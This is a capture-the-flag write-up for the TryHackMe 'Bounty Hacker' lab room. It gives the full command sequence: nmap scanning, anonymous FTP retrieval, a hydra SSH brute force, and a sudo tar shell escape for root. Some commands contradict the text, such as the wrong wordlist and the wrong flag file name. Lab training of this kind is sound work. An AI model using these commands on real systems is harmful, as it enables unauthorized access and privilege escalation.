# Bounty Hacker

<img align="right" src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/images/cowboyhacker/cowboyhacker1.png" width="150" height="150">

You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!

LINK = [https://tryhackme.com/room/cowboyhacker](https://tryhackme.com/room/cowboyhacker)

### FYI
This writeup don't include any passwords/cracked hashes/flags

# Description

You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future!

# Steps
1: Join the room, start the virtual machine and the AttackBox (or connect via VPN)

2: Find open ports on the machine, the nmap output will show three open ports:
* ```# nmap <ip-virtual-machine>```
<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/images/cowboyhacker/cowboyhacker2.png" width="30%">

3: Who wrote the task list?
* Access the ftp of the virtual machine with ```anonymous``` user
* ```# ftp <ip-virtual-machine>```
* List and download all the files in the ftp server
* ```ftp> dir```
* ```ftp> get locks.txt```
* ```ftp> get task.txt```
* View the content of tast.txt
* ```# cat task.txt```

4: What service can you bruteforce with the text file found?
* Check the result of the nmap scan

5: What is the users password? 
* Use hydra with the locks.txt file to bruteforce the ssh user and pasword
* ```# hydra -l lin -P /root/task.txt <ip-virtual-machine> ssh```
<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/images/cowboyhacker/cowboyhacker3.png" width="50%">

6: user.txt
* With the result of hydra login in to the virtual machine via ssh and get the flag of the ```user.txt```

7: root.txt
* Run ```# sudo -l``` to list the commands that the ```lin``` user can run as sudo, you can see that ```/bin/tar``` is the only one
* Go to [GTFOBins](https://gtfobins.github.io/) and search for ```tar``` bypass command and execute it:
* ```# sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh```
* Search the root.txt file
* ```# find / -name flag.txt 2>/dev/null```
<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/images/cowboyhacker/cowboyhacker4.png" width="25%">

* Get the flag!! 😎
